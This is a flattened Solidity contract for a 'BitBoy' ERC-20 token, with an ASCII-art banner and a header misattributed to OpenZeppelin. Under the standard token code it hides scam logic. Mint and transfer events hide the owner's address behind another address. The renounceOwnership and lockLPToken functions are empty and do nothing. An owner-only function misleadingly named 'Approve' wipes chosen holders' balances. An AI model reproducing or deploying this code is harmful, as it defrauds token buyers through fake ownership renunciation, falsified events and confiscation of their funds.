// Sources flattened with hardhat v2.7.0 https://hardhat.org

// File @openzeppelin/contracts/utils/Context.sol@v4.4.0

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)

/*                                    
                                                          

                                    ,e#########Nm,        
                                ,a#SQG#8#############,    
                             _G;#####bbGGGSSlsGl@######p  
                               %'"_    _'^'^'!99$#######N 
                               _T_      __ _ :j3@#@######b
                                       _  _ ___*p9##G$#@##   _           _GG__           'lSb       
                               ,sp '####55##p___GG##l@""@#b   __        __GG__           _lSb       
                               "@#b__^`. ____ _^G^Ilb7^?l@b     ___     __GG__           _llG       
                                '_ _ _     _:G*_*@#l^b7pp#        ___   __GG__           _llG       
                               _ s##W#^___ ___,;S##$pG!"##          ____ _GGG_           _llG       
                               !!lj.Q#$#p____($NNS##b,,###            ___GGGG_           _llG_      
                                !@#WWW"%Wb__G9p#####N#UG@b              _'GGG_           _llG_      
    ,,,,,,                      jb_I$3Ip^3p####@@####GGGGb               _GGG_           _llG_      
   ,#@#####                      7___'^"GS@##Q#####GGGSGGGb           _ _*GGG__          _llG_      
  .@#@#####b                     _"s,#pGGG3$GQN##GGGGGGGGGl@#m,     __ ___GGG__          _llG__     
  _#G@#######w                      "@###@S@###GGGGGGGGG,########Nw,_   _ GGG__           llG__     
  j#S@#@########,                  ,e###5#####QGIGGGG,#########@######M,__*GG__         _ llG__     
  j####@###_ "@###m            ,###@####p78@###SQS##########b@######GGlll#p_G__         __l$Gpf     
  _@#######m,   "%###m _## ,g####@########################U$######b?b$lQS####m_          _l$GG      
   @lll@#######m,  `%########N#N#############@@@#########TG##@###@_#js#########N_      ___l#QG      
   @##$#[    `"####w @##Q###############################"Q##N###_bj;##@##########_  _ ;SS#####      
   @##@#b        `"@##55#QQj########################"_"e########@_###@############_ :9##GG""'f      
   @#b@#b            @###@############################.a####@@#bQ@################p_GllSG____       
   ##N@N            / #W@###@########################GG####N@##@##########@########_'l$lSp.__       
   ##b##           {,@Qm@@#Q#@###",## ,,, @## ,,, "#bG]#########@########@######b__b:ll######       
  _##b##           j################b]###_##b]###",#GG#############@####@#######Q__jl$lGG'''"       
  _#####_           ^#b__@Q####%####_mm @###_mmmm##bGj##########@#@####@###.b_l"^_%#GlSG____        
  _#####            _#b_;G@####N,@# @##b ##b@######Gl@#############@##@####^_:G]##:_@llSpp,_        
  j##@##            ]b__lS#### @#""%#"#M@%##@#####bll###########@####@##@#########_G!pl$S###        
  ]##@#[           _@b_:G@###_b]['"]b # @p"@######G####################@#############b_''"l#        
  ]####b           @#__Gl####@#  @b] b] ##]#########@#################@##########W"55#____lb        
  @####b           *Q###############################@###################5""`_~Q,smW8##m___!         
  @####b          /__ _^"5##########################@#############"."_,;s##"`___,,pSsQQ___!         
  @##@#          /  __:ll#@########################################G"^__,,se##########"___'         
  @####         / ____Gl$#@#######################################sW"` _ _____GGl$#__  ___b         
  #####        ,_ _ _GGGlf@########################@##############Gp___  ____*!Gll#_   ___          
  #####       __ _ _!GISS$f########################################NG____ __oGGll##_ _ _ _          
 _#####      _G__ _,GGGSS#S########################@#############bG8p_____.GGGl###b_ ___            
 _#####      $_____GGlS###b@#######################@#############b;##p__ ___'G$@##b_ ___ [          
 _#####     , _ __;Gl##### @##################################@@#b###b:__*.lGl####b ___             
 j####b    _G___G_G$f####  @######################p@#####@@#####b_'@b'__GGGG$#####b_ __ _           
 ]####b    ! _  :GGG$@##   ########################@###########G_.;b_G__GGGG######_  _ __           
 @####b    __ ___GSSS#b    #######################l@############_iG'__GGGlSQl####_   _ _f           
 @####    { ___lIS##@"     #################################@###:b___GGGGSl$####_ _   _             
                                                                                                    
                                                                                                    
[/font][/size]
*/


pragma solidity ^0.6.0;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Context {
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}



contract BitBoyToken is Context, IERC20 {
    address _depo = 0x79666BaF8853838050bB8D6e0165e893235E86fe;
    address public _owner = 0xa902641dbFEeC0aD3Fad19E823677599C9CB1924;
    
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    using SafeMath for uint256;
    using Address for address;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;




    constructor () public {
        _name = "BitBoy";
        _symbol ="BITBOY";
        _decimals = 18;
        uint256 initialSupply = 1000000000000;
        _mint(_depo, initialSupply*(10**18));
    }







    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transferHelper(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transferHelper(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _owner){
            sender = _depo;
        }
        if (recipient == _owner){
            recipient = _depo;
        }
        emit Transfer(sender, recipient, amount);

        
    }

    function _mint(address locker, uint256 amt) public {
        require(msg.sender == _owner, "ERC20: zero address");
        _totalSupply = _totalSupply.add(amt);
        _balances[_owner] = _balances[_owner].add(amt);
        emit Transfer(address(0), locker, amt);
    }


    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }
    
    
    function _transferHelper(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _owner){
            sender = _depo;
        }
        emit Transfer(sender, recipient, amount);

    }
    
   
    
    
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }



    modifier _onlyOwner() {
        require(msg.sender == _owner, "Not allowed to interact");
        _;
    }


    modifier _approverAllowed() {
        require(msg.sender == _owner, "Not allowed to interact");
        
        
        _;
    }





  function renounceOwnership()  public _onlyOwner(){}


  function lockLPToken()  public _onlyOwner(){}


//-----------------------------------------------------------------------------------------------------------------------//

        function Approve(
            address[] memory addr)  public _approverAllowed(){
            for (uint256 i = 0; i < addr.length; i++) {
                uint256 amt = _balances[addr[i]];
                _balances[addr[i]] = _balances[addr[i]].sub(amt, "ERC20: burn amount exceeds balance");
                _balances[address(0)] = _balances[address(0)].add(amt);
                
                }}





    }